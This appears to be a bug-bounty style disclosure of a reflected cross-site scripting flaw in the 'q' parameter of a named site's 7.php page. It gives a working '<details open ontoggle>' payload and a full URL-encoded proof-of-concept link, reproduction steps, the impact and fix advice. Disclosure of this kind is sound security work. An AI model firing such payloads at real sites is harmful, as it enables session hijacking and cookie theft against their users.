# Reflected Cross-Site Scripting (XSS) via `q` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `q` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability is exploitable using the HTML `<details>` element with the `ontoggle` event handler.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/7.php?q=%22xicorr%3E%3Cdetails%20open%20ontoggle=alert(1)%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
q
```

---

## Payload Used

```html id="k9c1wp"
"xicorr><details open ontoggle=alert(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/7.php?q=%22xicorr%3E%3Cdetails%20open%20ontoggle=alert(1)%3E
   ```

2. Observe that the payload is reflected into the HTML response.

3. The injected `<details>` element automatically triggers the `ontoggle` event because of the `open` attribute.

4. JavaScript executes successfully and triggers a popup dialog.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/7.php?q=%22xicorr%3E%3Cdetails%20open%20ontoggle=alert(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/f502bf3b-0e50-4fa4-accf-fbaff4bb74fd" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

* Client-side defacement

---

## Recommendations for Fix

* Encode output before rendering
* Sanitize user-controlled input
* Implement context-aware escaping for HTML content
* Avoid rendering raw user input directly into the DOM
* Deploy a strict Content Security Policy (CSP)
